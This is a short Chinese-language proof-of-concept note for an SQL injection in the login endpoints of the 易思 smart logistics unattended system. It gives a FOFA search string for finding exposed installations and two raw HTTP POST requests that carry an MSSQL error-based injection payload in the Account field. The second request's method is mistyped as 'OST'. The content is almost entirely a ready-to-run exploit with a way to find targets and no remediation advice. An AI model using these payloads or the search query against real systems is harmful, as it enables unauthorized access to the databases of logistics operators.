## 易思智能物流无人值守系统login存在SQL注入漏洞

易思智能物流无人值守系统login存在SQL注入漏洞.md

## fofa

```javascript
body="/api/SingleLogin"
```

## poc

```javascript
POST /api/PhoneLogin/login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

Account=1'%20and%20sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))=1--&Espassword=g5edid4OCFI32C5NPEZeXg%3D%3D
```

```javascript
OST /api/SingleLogin/login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Priority: u=0
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate

LoginUserType=0&DeviceType=2&Account=1'%20and%20sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))=1--&BrowserType=Firefox&Verifycode=&IMEI=&isverify=false&SetOfBooks=Default&Espassword=1wD%2Bj6eIbahZGOatg1Spiw%3D%3D
```

![image-20241106172316570](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411061723637.png)
